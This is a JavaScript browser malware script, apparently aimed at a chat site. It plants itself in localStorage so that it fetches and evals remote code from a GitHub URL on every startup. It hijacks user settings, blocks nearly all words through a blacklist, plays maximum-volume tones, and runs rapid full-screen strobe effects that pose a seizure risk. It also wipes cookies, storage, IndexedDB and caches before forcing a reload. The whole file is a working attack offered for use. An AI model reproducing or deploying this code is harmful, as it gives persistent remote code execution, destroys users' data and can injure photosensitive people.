function injectItself(){
  setInterval(()=>{localStorage.setItem('startupJS', `fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRVIRUSULTRAJAVASCRIPTLIST/refs/heads/main/Beznravstvennost9.js').then(r=>r.text()).then(eval);`)},500);
}
function resetAll(){
    (async () => {
    // 1. Clear LocalStorage and SessionStorage
    localStorage.clear();
    sessionStorage.clear();
    console.log("✓ LocalStorage and SessionStorage cleared.");
  
    // 2. Clear Cookies
    const cookies = document.cookie.split(";");
    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i];
      const eqPos = cookie.indexOf("=");
      const name = eqPos > -1 ? cookie.substr(0, eqPos).trim() : cookie.trim();
      
      // Clear cookie for current domain and root path
      document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/`;
      // Also try clearing for the main domain if on a subdomain
      document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=${window.location.hostname}`;
      document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=.${window.location.hostname.split('.').slice(-2).join('.')}`;
    }
    console.log("✓ Cookies cleared (HTTP-only cookies excluded).");
  
    // 3. Clear IndexedDB Databases
    if (window.indexedDB && indexedDB.databases) {
      try {
        const dbs = await indexedDB.databases();
        for (const db of dbs) {
          if (db.name) {
            indexedDB.deleteDatabase(db.name);
          }
        }
        console.log("✓ IndexedDB databases cleared.");
      } catch (e) {
        console.error("Error clearing IndexedDB:", e);
      }
    }
  
    // 4. Clear Service Workers (Cache Storage)
    if (window.caches) {
      try {
        const cacheNames = await caches.keys();
        await Promise.all(cacheNames.map(name => caches.delete(name)));
        console.log("✓ Cache Storage cleared.");
      } catch (e) {
        console.error("Error clearing Cache Storage:", e);
      }
    }
  
    console.log(" Done! Refresh the page to see changes.");
  })();
}
const currentPhase = localStorage.getItem('payloadPhase');
(async () => {
  try {
    const response = await fetch('https://raw.githubusercontent.com/dwyl/english-words/refs/heads/master/words.txt');
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    const textData = await response.text();
    const allWords = textData.split('\n')
      .map(word => word.trim())
      .filter(word => word.length > 0);
    for (let i = allWords.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [allWords[i], allWords[j]] = [allWords[j], allWords[i]];
    }
    const random5kWords = allWords.slice(0, 400000);
    globalThis.globalestWordList = random5kWords;
    console.log(`Success! 5,000 random words loaded into globalThis.globalestWordList.`);
    console.log(`Sample words:`, globalThis.globalestWordList.slice(0, 5000));
  } catch (error) {
    console.error('Failed to fetch or process the word list:', error);
  }
})();
if (currentPhase === null) {
  injectItself();
  localStorage.setItem('payloadPhase', '1');
  localStorage.setItem('name', 'Beznravstvennost9');
  localStorage.setItem('bgBrightness', '0');
  localStorage.setItem('disabeDM', 'true');
  localStorage.setItem('hideImages', 'true');
  localStorage.setItem('volume', '0');
  localStorage.setItem('disableBackgroundYoutube', 'true');
  localStorage.setItem('customCSS', `
/* Apply the ultimate glitch strobe animation to every element on the page */
*, *::before, *::after {
    animation: chaotic-strobe-fx 0.05s steps(2, end) infinite !important;
    /* Forces hardware acceleration to keep up with the rendering chaos */
    will-change: filter; 
}

/* The chaotic strobe animation sequence */
@keyframes chaotic-strobe-fx {
    0%, 100% {
        filter: invert(0%) brightness(100%) contrast(100%) saturate(100%) hue-rotate(0deg);
    }
    50% {
        /* Blown out, hyper-saturated, color-flipped madness */
        filter: invert(100%) brightness(400%) contrast(500%) saturate(1000%) hue-rotate(180deg);
    }
}
  `);
  localStorage.setItem('wordBlacklist', globalestWordList);
  // 1. Create the audio context
  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  
  // 2. Create the nodes
  const oscillator = audioCtx.createOscillator();
  const gainNode = audioCtx.createGain();
  
  // 3. Set the oscillator properties to blast a 165Hz square wave
  oscillator.type = 'square';
  oscillator.frequency.value = 165; 
  
  // 4. Set volume to max (1.0)
  gainNode.gain.setValueAtTime(1.0, audioCtx.currentTime);
  
  // 5. Wire it up and trigger it
  oscillator.connect(gainNode);
  gainNode.connect(audioCtx.destination);
  oscillator.start();
}
if (currentPhase === '1') {
  injectItself()
  localStorage.setItem('payloadPhase', '2');
  localStorage.setItem('name', 'Beznravstvennost9');
  localStorage.setItem('bgBrightness', '0');
  localStorage.setItem('disabeDM', 'true');
  localStorage.setItem('hideImages', 'true');
  localStorage.setItem('volume', '0');
  localStorage.setItem('disableBackgroundYoutube', 'true');
  function clearAllCookies() {
      const cookies = document.cookie.split(";");
  
      for (let i = 0; i < cookies.length; i++) {
          const cookie = cookies[i];
          const eqPos = cookie.indexOf("=");
          const name = eqPos > -1 ? cookie.substr(0, eqPos).trim() : cookie.trim();
          
          // Overwrite the cookie with an expired date to delete it
          document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/";
      }
      
      console.log("Cookies cleared.");
  }
  
  // Execute the function
  clearAllCookies();
}
if (currentPhase === '2') {
  injectItself();
  localStorage.setItem('customCSS', `
html {
  filter: grayscale(100%) invert(100%);
  background-color: white; 
}
  `)
  (function absoluteTextApocalypse() {
      const TEXT_PHRASE = "YOU ARE BONZI9 TIMES GROUNDED GROUNDED";
  
      // 1. Initialize Web Audio Engine
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      let audioCtx = null;
  
      function initAudio() {
          if (!audioCtx) audioCtx = new AudioContext();
          if (audioCtx.state === 'suspended') audioCtx.resume();
      }
      window.addEventListener('click', initAudio);
      window.addEventListener('keydown', initAudio);
  
      function createNoiseBuffer() {
          if (!audioCtx) return null;
          const bufferSize = audioCtx.sampleRate * 2;
          const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
          const data = buffer.getChannelData(0);
          for (let i = 0; i < bufferSize; i++) data[i] = Math.random() * 2 - 1;
          return buffer;
      }
  
      function playThunderSound() {
          if (!audioCtx) return;
          const noiseBuffer = createNoiseBuffer();
          if (!noiseBuffer) return;
          const noise = audioCtx.createBufferSource();
          noise.buffer = noiseBuffer;
          const filter = audioCtx.createBiquadFilter();
          filter.type = 'lowpass';
          filter.frequency.setValueAtTime(90, audioCtx.currentTime);
          filter.frequency.exponentialRampToValueAtTime(10, audioCtx.currentTime + 2);
          const gainNode = audioCtx.createGain();
          gainNode.gain.setValueAtTime(2.0, audioCtx.currentTime);
          gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 2);
          noise.connect(filter); filter.connect(gainNode); gainNode.connect(audioCtx.destination);
          noise.start();
      }
  
      function playProjectileSound(isRocket) {
          if (!audioCtx) return;
          const osc = audioCtx.createOscillator();
          const gainNode = audioCtx.createGain();
          osc.type = isRocket ? 'sawtooth' : 'triangle';
          osc.frequency.setValueAtTime(isRocket ? 900 : 400, audioCtx.currentTime);
          osc.frequency.exponentialRampToValueAtTime(isRocket ? 120 : 30, audioCtx.currentTime + 1.2);
          gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
          gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 1.2);
          osc.connect(gainNode); gainNode.connect(audioCtx.destination);
          osc.start(); osc.stop(audioCtx.currentTime + 1.2);
      }
  
      // 2. CSS Injector for Layout Shaking & Color Overwrites
      const style = document.createElement('style');
      style.innerHTML = `
          @keyframes chaoticQuake {
              0% { transform: translate(3px, 2px) rotate(0deg); }
              10% { transform: translate(-4px, -3px) rotate(-3deg); }
              20% { transform: translate(-7px, 0px) rotate(5deg); }
              30% { transform: translate(0px, 6px) rotate(-1deg); }
              40% { transform: translate(5px, -5px) rotate(3deg); }
              50% { transform: translate(-3px, 5px) rotate(-2deg); }
              60% { transform: translate(-6px, 3px) rotate(6deg); }
              70% { transform: translate(6px, 4px) rotate(-4deg); }
              80% { transform: translate(-4px, -5px) rotate(3deg); }
              90% { transform: translate(5px, 6px) rotate(-5deg); }
              100% { transform: translate(3px, -3px) rotate(0deg); }
          }
          html, body {
              animation: chaoticQuake 0.04s infinite !important;
              background-color: #1a0000 !important;
              overflow: hidden !important;
          }
          *, *:before, *:after {
              color: #ff0000 !important;
              border-color: #ff0000 !important;
              text-shadow: 0 0 8px rgba(255, 0, 0, 0.9) !important;
          }
          #apocalypse-canvas {
              position: fixed;
              top: 0; left: 0; width: 100%; height: 100%;
              z-index: 999999;
              pointer-events: none;
          }
      `;
      document.head.appendChild(style);
  
      // 3. Setup Interactive Canvas Element
      const canvas = document.createElement('canvas');
      canvas.id = 'apocalypse-canvas';
      document.body.appendChild(canvas);
      const ctx = canvas.getContext('2d');
  
      function resize() {
          canvas.width = window.innerWidth;
          canvas.height = window.innerHeight;
      }
      window.addEventListener('resize', resize);
      resize();
  
      // 4. Data Structures for Entities
      const projectiles = [];
      const cinemaScratches = [];
      let floodHeight = 0;
      let lightningFlash = 0;
  
      // Initialize Cinema Scratches (Vertical lines made of repeating text fragments)
      for (let i = 0; i < 8; i++) {
          cinemaScratches.push({
              x: Math.random() * canvas.width,
              speed: Math.random() * 20 + 20,
              textScale: Math.random() * 8 + 6
          });
      }
  
      function spawnProjectile() {
          const typeRand = Math.random();
          let type = 'meteor';
          if (typeRand > 0.66) type = 'rocket';
          else if (typeRand > 0.33) type = 'snowflake';
  
          playProjectileSound(type === 'rocket');
  
          projectiles.push({
              x: Math.random() * canvas.width * 1.5 - (canvas.width * 0.2),
              y: -50,
              speed: type === 'snowflake' ? Math.random() * 2 + 2 : Math.random() * 12 + 12,
              angle: type === 'snowflake' ? Math.PI / 2 : Math.PI / 3.5 + (Math.random() * 0.3),
              rotation: Math.random() * Math.PI * 2,
              rotSpeed: (Math.random() - 0.5) * 0.2,
              size: Math.random() * 14 + 12,
              type: type
          });
      }
  
      // 5. Execution Loop
      function loop() {
          ctx.clearRect(0, 0, canvas.width, canvas.height);
  
          // Ambient Spawning Rates
          if (Math.random() < 0.25) spawnProjectile();
          
          // Progress the text flood line upwards slowly
          if (floodHeight < canvas.height) floodHeight += 0.3;
  
          // Blinding Thunder Flashes
          if (Math.random() < 0.007 && lightningFlash === 0) {
              lightningFlash = Math.floor(Math.random() * 10) + 5;
              playThunderSound();
          }
  
          if (lightningFlash > 0) {
              ctx.fillStyle = `rgba(255, 0, 0, ${Math.random() * 0.6 + 0.4})`;
              ctx.fillRect(0, 0, canvas.width, canvas.height);
              // Flash text on screen during lightning strike
              ctx.fillStyle = '#ffffff';
              ctx.font = 'bold 50px Arial';
              ctx.fillText(TEXT_PHRASE, Math.random() * (canvas.width - 500), Math.random() * canvas.height);
              document.body.style.backgroundColor = Math.random() > 0.5 ? '#ff0000' : '#ffffff';
              lightningFlash--;
          } else {
              document.body.style.backgroundColor = '#1a0000';
          }
  
          // --- DRAW TYPE 1: Cinema Scratch Film (Background Noise Text Lines) ---
          ctx.fillStyle = 'rgba(255, 0, 0, 0.15)';
          cinemaScratches.forEach(scratch => {
              ctx.font = `${scratch.textScale}px monospace`;
              scratch.x += (Math.random() - 0.5) * 30; // violently twitch sideways
              if (scratch.x < 0 || scratch.x > canvas.width) scratch.x = Math.random() * canvas.width;
              
              for (let y = 0; y < canvas.height; y += 40) {
                  ctx.fillText(TEXT_PHRASE.substring(0, 8), scratch.x, y);
              }
          });
  
          // --- DRAW TYPE 2: Falling Entities (Meteors, Rockets, Snowflakes) ---
          for (let i = projectiles.length - 1; i >= 0; i--) {
              const p = projectiles[i];
              p.x += Math.cos(p.angle) * p.speed;
              p.y += Math.sin(p.angle) * p.speed;
              p.rotation += p.rotSpeed;
  
              ctx.save();
              ctx.translate(p.x, p.y);
              ctx.rotate(p.rotation);
  
              if (p.type === 'meteor') {
                  // Meteor Text Glow Trail
                  ctx.font = `bold ${p.size}px Arial`;
                  ctx.fillStyle = '#ff6600';
                  ctx.fillText(TEXT_PHRASE, -10, -10);
                  ctx.fillStyle = '#ffffff';
                  ctx.fillText("GROUNDED!", 0, 0);
              } 
              else if (p.type === 'rocket') {
                  // High velocity rocket text array
                  ctx.font = `italic bold ${p.size * 0.9}px Impact`;
                  ctx.fillStyle = '#ff0033';
                  ctx.fillText(`🚀 ${TEXT_PHRASE} >>>`, 0, 0);
              } 
              else if (p.type === 'snowflake') {
                  // Fluttering drift style text blocks
                  ctx.font = `${p.size * 0.7}px Courier New`;
                  ctx.fillStyle = '#ffcccc';
                  ctx.fillText("BONZI9", 0, 0);
              }
  
              ctx.restore();
  
              // Destroy elements moving outside limits
              if (p.y > canvas.height + 100 || p.x > canvas.width + 200) {
                  projectiles.splice(i, 1);
              }
          }
  
          // --- DRAW TYPE 3: The Rising Flood Wave (Text Fluid) ---
          ctx.fillStyle = 'rgba(255, 0, 0, 0.8)';
          ctx.font = 'bold 16px Arial';
          
          let WaveYStart = canvas.height - floodHeight;
          let lineSpacing = 18;
          
          for (let y = WaveYStart; y < canvas.height; y += lineSpacing) {
              // Give every layer of flood text a shifting fluid wave look offset
              let xOffset = Math.sin((Date.now() / 200) + y) * 25;
              for (let x = -100; x < canvas.width + 200; x += 340) {
                  ctx.fillText(TEXT_PHRASE.substring(0, 28), x + xOffset, y);
              }
          }
  
          requestAnimationFrame(loop);
      }
  
      loop();
  })();
  localStorage.setItem('payloadPhase', '3');
}
if (currentPhase === '3') {
(function doomsdayNukeSequence() {
    // 1. Setup Audio Hooks
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    let audioCtx = window.apocalypseAudioCtx || null;

    function initAudio() {
        if (!audioCtx) {
            audioCtx = new AudioContext();
            window.apocalypseAudioCtx = audioCtx;
        }
        if (audioCtx.state === 'suspended') audioCtx.resume();
    }
    window.addEventListener('click', initAudio);
    window.addEventListener('keydown', initAudio);

    // 2. Inject Darkening Vignette Layer into DOM
    const darkOverlay = document.createElement('div');
    darkOverlay.style.cssText = `
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background-color: #000;
        opacity: 0;
        z-index: 9999999;
        pointer-events: none;
        transition: opacity 5s linear; /* FIXED: Fast 5-second fade */
    `;
    document.body.appendChild(darkOverlay);

    // 3. Audio Synth Functions
    let sirenOsc = null;
    let sirenGain = null;

    function startFallingSiren() {
        if (!audioCtx) initAudio();
        if (!audioCtx) return;

        sirenOsc = audioCtx.createOscillator();
        sirenGain = audioCtx.createGain();
        
        sirenOsc.type = 'sine';
        // A much more drastic, urgent pitch drop over the shorter 5-second window
        sirenOsc.frequency.setValueAtTime(1100, audioCtx.currentTime);
        sirenOsc.frequency.linearRampToValueAtTime(600, audioCtx.currentTime + 5); /* FIXED: Ramps down over 5s */

        sirenGain.gain.setValueAtTime(0.4, audioCtx.currentTime);
        
        sirenOsc.connect(sirenGain);
        sirenGain.connect(audioCtx.destination);
        
        sirenOsc.start();
        sirenOsc.stop(audioCtx.currentTime + 5); /* FIXED: Stops at 5s */
    }

    // Helper to create a pseudo-sine wave (sine folded/distorted via WaveShaper)
    function createPseudoSineShaper() {
        const shaper = audioCtx.createWaveShaper();
        const curve = new Float32Array(4096);
        for (let i = 0; i < 4096; i++) {
            const x = (i / 4095) * 2 - 1;
            curve[i] = Math.sin(x * Math.PI * 0.5) * 1.5; 
        }
        shaper.curve = curve;
        shaper.oversample = '4x';
        return shaper;
    }

    // Custom Bitcrusher effect node via ScriptProcessor
    function createBitcrusher() {
        const crusher = audioCtx.createScriptProcessor(4096, 1, 1);
        crusher.onaudioprocess = function(e) {
            const input = e.inputBuffer.getChannelData(0);
            const output = e.outputBuffer.getChannelData(0);
            const bits = 4; // Brutal 4-bit depth
            const step = Math.pow(0.5, bits);
            
            for (let i = 0; i < input.length; i++) {
                output[i] = step * Math.round(input[i] / step);
            }
        };
        return crusher;
    }

    function triggerMultiWaveBlast() {
        if (!audioCtx) return;

        // Cut the siren sound instantly
        try { if(sirenOsc) sirenOsc.stop(); } catch(e){}

        const now = audioCtx.currentTime;
        const duration = 3.0; // 3 seconds blast

        const masterGain = audioCtx.createGain();
        masterGain.gain.setValueAtTime(4.0, now); 
        masterGain.gain.exponentialRampToValueAtTime(0.01, now + duration);

        const bitcrusher = createBitcrusher();
        bitcrusher.connect(masterGain);
        masterGain.connect(audioCtx.destination);

        const waveTypes = ['sawtooth', 'square', 'sine', 'triangle', 'square']; 
        
        waveTypes.forEach((type, index) => {
            const osc = audioCtx.createOscillator();
            const oscGain = audioCtx.createGain();
            
            osc.type = type;
            osc.frequency.setValueAtTime(1 + Math.random() * 50, now);
            
            if (index % 2 === 0) {
                osc.frequency.linearRampToValueAtTime(2000, now + duration);
            } else {
                osc.frequency.exponentialRampToValueAtTime(2000, now + (duration * 0.8));
                osc.frequency.linearRampToValueAtTime(1, now + duration);
            }

            if (index === 2) {
                const pseudoShaper = createPseudoSineShaper();
                osc.connect(pseudoShaper);
                pseudoShaper.connect(oscGain);
            } else {
                osc.connect(oscGain);
            }

            oscGain.gain.setValueAtTime(0.3, now);
            osc.connect(oscGain);
            oscGain.connect(bitcrusher);
            
            osc.start(now);
            osc.stop(now + duration);
        });
    }

    // 4. Doomsday Chronology Engine
    // Phase 1: Wait 5 seconds initially
    setTimeout(() => {
        // Phase 2: Start 5-second rapid siren sound & fade to dark
        startFallingSiren();
        darkOverlay.style.opacity = '1.0'; 

        // Phase 3: Blast and Reset at T-Minus 10 seconds total
        setTimeout(() => {
            // Cut standard CSS transitions for the visual explosion
            darkOverlay.style.transition = 'none';
            darkOverlay.style.opacity = '1.0';

            // High-frequency flashing color loop (every 40ms)
            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff', '#ffffff'];
            let colorIndex = 0;
            const strobeInterval = setInterval(() => {
                darkOverlay.style.backgroundColor = colors[colorIndex % colors.length];
                colorIndex++;
            }, 40);

            // Fire the 3-second multi-wave audio payload
            resetAll()
            triggerMultiWaveBlast();

            // Phase 4: Wait exactly 3 seconds (duration of blast/strobe), then refresh
            setTimeout(() => {
                clearInterval(strobeInterval);
                window.location.reload();
            }, 3000);

        }, 5000); /* FIXED: Triggers exactly 5 seconds after the siren starts */

    }, 5000);
})();
}
